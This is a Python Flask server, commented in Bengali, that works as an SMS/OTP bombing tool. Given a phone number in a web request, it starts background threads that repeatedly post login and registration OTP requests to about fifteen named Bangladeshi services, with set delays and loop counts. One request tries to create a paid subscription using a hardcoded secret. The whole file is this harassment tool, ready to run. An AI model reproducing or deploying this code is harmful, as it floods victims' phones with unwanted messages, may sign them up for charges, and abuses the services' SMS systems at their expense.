import time
import threading
import requests
from flask import Flask, request, jsonify

app = Flask(__name__)

# JSON এপিআইয়ের জন্য রিকোয়েস্ট পাঠানোর ফাংশন
def send_json_request(url, payload_template, phone_11, phone_with_plus, phone_with_880, delay_seconds, total_loops, headers=None):
    payload = {}
    for key, value in payload_template.items():
        if isinstance(value, str):
            if "+88" in value:
                payload[key] = phone_with_plus
            elif value.startswith("88"):
                payload[key] = phone_with_880
            else:
                payload[key] = phone_11
        else:
            payload[key] = value

    for _ in range(total_loops):
        try:
            requests.post(url, json=payload, headers=headers, timeout=5)
        except Exception:
            pass
        time.sleep(delay_seconds)

# Urlencoded এপিআইয়ের জন্য রিকোয়েস্ট পাঠানোর ফাংশন (স্ক্রিনশটের মতো)
def send_form_request(url, data_template, phone_11, delay_seconds, total_loops, headers=None):
    data = {}
    for key, value in data_template.items():
        if isinstance(value, str) and value == "DYNAMIC_PHONE":
            data[key] = phone_11
        else:
            data[key] = value

    for _ in range(total_loops):
        try:
            requests.post(url, data=data, headers=headers, timeout=5)
        except Exception:
            pass
        time.sleep(delay_seconds)

def run_all_apis(phone):
    raw_phone = phone.strip()
    if raw_phone.startswith("+880"):
        phone_11 = raw_phone[4:]
    elif raw_phone.startswith("880"):
        phone_11 = raw_phone[3:]
    else:
        phone_11 = raw_phone[-11:]

    phone_with_plus = f"+880{phone_11}"
    phone_with_880 = f"880{phone_11}"

    # 1. JSON APIs Config
    json_apis = [
        {"url": "https://www.khaasfood.com/api/auth/request-otp", "body": {"username": ""}, "delay": 122, "loops": 5},
        {"url": "https://tethys.trucklagbe.com/tl_gateway/tl_login/131/loginWithPhoneNo", "body": {"userType": "shipper", "phoneNo": ""}, "delay": 33, "loops": 10},
        {"url": "https://frontendapi.kireibd.com/api/v2/send-login-otp", "body": {"email": ""}, "delay": 122, "loops": 10},
        {"url": "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", "body": {"number": "+88"}, "delay": 122, "loops": 10},
        {"url": "https://bb-api.bohubrihi.com/public/activity/otp", "body": {"phone": "", "intent": "login"}, "delay": 122, "loops": 10},
        {"url": "https://api.apex4u.com/api/auth/login", "body": {"phoneNumber": ""}, "delay": 180, "loops": 5},
        {"url": "https://www.wafilife.com/api/auth/send-otp", "body": {"mobileNumber": ""}, "delay": 33, "loops": 10},
        {"url": "https://gpfi-api.grameenphone.com/api/v1/fwa/request-for-otp", "body": {"phone": "", "email": "", "language": "en"}, "delay": 61, "loops": 10},
        {"url": "https://www.admissiontaker.site/api/send-reg-otp", "body": {"phone_number": ""}, "delay": 10, "loops": 50},
        {"url": "https://api.toybox.live/bdapps_handler.php", "body": {"Operation": "CreateSubscription", "MobileNumber": "88", "PackageID": 100, "Secret": "HJKX71%UHYHa"}, "delay": 12, "loops": 5},
        {"url": "https://api.garibookadmin.com/api/v4/user/login", "body": {"mobile": "+88", "recaptcha_token": "garibookcaptcha", "channel": "web"}, "delay": 182, "loops": 5},
        {"url": "https://backend.timezonebd.com/api/v1/user/otp-login", "body": {"phone": ""}, "delay": 301, "loops": 3},
        {"url": "https://www.shwapno.com/api/auth", "body": {"phoneNumber": "+88"}, "delay": 32, "loops": 2}
    ]

    # 2. Urlencoded (Form Data) APIs Config (স্ক্রিনশট অনুযায়ী)
    form_apis = [
        # Grameenphone Webloginda
        {"url": "https://webloginda.grameenphone.com/backend/api/v1/otp", "data": {"msisdn": "DYNAMIC_PHONE"}, "delay": 12, "loops": 10},
        
        # Arogga
        {"url": "https://api.arogga.com/auth/v1/sms/send?f=mweb&b=Chrome&v=150.0.7871.46&os=Android&osv=14", "data": {"mobile": "DYNAMIC_PHONE", "fcmToken": "", "referral": ""}, "delay": 32, "loops": 10}
    ]

    # JSON থ্রেডগুলো চালানো
    for api in json_apis:
        t = threading.Thread(
            target=send_json_request,
            args=(api["url"], api["body"], phone_11, phone_with_plus, phone_with_880, api["delay"], api["loops"])
        )
        t.daemon = True
        t.start()

    # Form Data (Urlencoded) থ্রেডগুলো চালানো
    for api in form_apis:
        t = threading.Thread(
            target=send_form_request,
            args=(api["url"], api["data"], phone_11, api["delay"], api["loops"])
        )
        t.daemon = True
        t.start()

@app.route('/', methods=['GET'])
def home():
    return jsonify({"status": "active", "message": "Multi-API Server is up and running!"}), 200

@app.route('/api', methods=['GET'])
def custom_api():
    phone = request.args.get('phone')
    if not phone:
        return jsonify({"status": "error", "message": "Phone number missing"}), 400

    threading.Thread(target=run_all_apis, args=(phone,), daemon=True).start()

    return jsonify({"status": "success", "message": "All APIs triggered successfully in background."}), 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
